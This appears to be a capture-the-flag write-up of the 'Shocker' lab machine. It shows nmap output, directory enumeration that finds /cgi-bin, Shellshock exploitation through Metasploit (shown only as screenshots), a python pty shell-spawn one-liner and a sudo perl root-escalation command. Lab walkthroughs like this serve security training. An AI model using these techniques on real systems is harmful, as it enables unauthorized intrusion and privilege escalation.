# nmap

enumerating the target with nmap we get the results as
```
nmap -Pn -A  -p-20000 -sS --vv 10.129.1.175                                130 тип
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 11:51 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:51
Completed NSE at 11:51, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:51
Completed Parallel DNS resolution of 1 host. at 11:51, 0.01s elapsed
Initiating SYN Stealth Scan at 11:51
Scanning 10.129.1.175 [20000 ports]
Discovered open port 80/tcp on 10.129.1.175
Discovered open port 2222/tcp on 10.129.1.175
Increasing send delay for 10.129.1.175 from 0 to 5 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 11:54, 151.85s elapsed (20000 total ports)
Initiating Service scan at 11:54
Scanning 2 services on 10.129.1.175
Completed Service scan at 11:54, 6.42s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.1.175
Retrying OS detection (try #2) against 10.129.1.175
Retrying OS detection (try #3) against 10.129.1.175
Retrying OS detection (try #4) against 10.129.1.175
Retrying OS detection (try #5) against 10.129.1.175
Initiating Traceroute at 11:54
Completed Traceroute at 11:54, 0.20s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:54
Completed Parallel DNS resolution of 2 hosts. at 11:54, 0.04s elapsed
NSE: Script scanning 10.129.1.175.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 6.84s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 1.08s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Nmap scan report for 10.129.1.175
Host is up, received user-set (0.23s latency).
Scanned at 2021-08-12 11:51:32 IST for 184s
Not shown: 19998 closed ports
Reason: 19998 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/12%OT=80%CT=1%CU=31521%PV=Y%DS=2%DC=T%G=Y%TM=6114BEA
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=100%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M54BST11NW6%O2=M54BST11NW6%O3=M54BNNT11NW6%O4=M54BST11NW6%O5=M54BST11
OS:NW6%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.037 days (since Thu Aug 12 11:01:55 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   189.95 ms 10.10.16.1
2   190.07 ms 10.129.1.175

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.77 seconds
           Raw packets sent: 21264 (939.666KB) | Rcvd: 25425 (2.088MB)
```


so, from the results of nmap scan,we get to know that on port 80,http is running and the ssh service is running on port 2222.

Not much juicy it seems.


# gobuster

I ran gobuster for busting the directories on the website ,results are

![gobuster1](/Images/gobuster-shocker_1.PNG)

nothing out of ordinary here except /cgi-bin.

performing further enumeration reveals.....

![gobuster2](/Images/gobuster-shocker_2.PNG)


I am not fully aware of what it is,so I asked google.

[what is cgi?](https://en.wikipedia.org/wiki/Common_Gateway_Interface)

getting to know what cgi is ,gave me a insight of what we are gonna do.

without hesitation i searched google for a way to exploit the cgi utility and finally came to know that I am working on an infamous exploit called [Shellshock](https://null-byte.wonderhowto.com/how-to/exploit-shellshock-vulnerable-websites-with-just-web-browser-0162580/#:~:text=Shellshock%20is%20a%20vulnerability%20in,1%20to%20v4.&text=A%20series%20of%20random%20characters,iOS%20systems%20has%20already%20occurred.)


# metasploit

I searched for shellshock in metasploit and got quitea few results back

![metasploit1](/Images/metasploit-search.PNG)

the images here after are self-explanatory.

![metasploit2](/Images/exploit-shellshock.PNG)

firing off the exploit.

![metasploit3](/Images/shell-shocker.PNG)
 
yay!we successfully gained a meterpreter session on the machine.

use the shelll command to convert it into a non interactive shell and then spawn the shell using

>python3 -c 'import pty;pty.spawn("/bin/bash")'

so,here we are as a user shelly. It's time we became root.

# privilege escalation

so,I ran sudo -l which gives us the services that we can run as root.

```
shelly@Shocker:/$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

so,I went to [gtfobins](https://gtfobins.github.io/gtfobins/perl/#suid) and seached for perl. 

>sudo perl -e 'exec "/bin/sh";'

executing this made me root :)

![root](/Images/root-shocker.PNG)
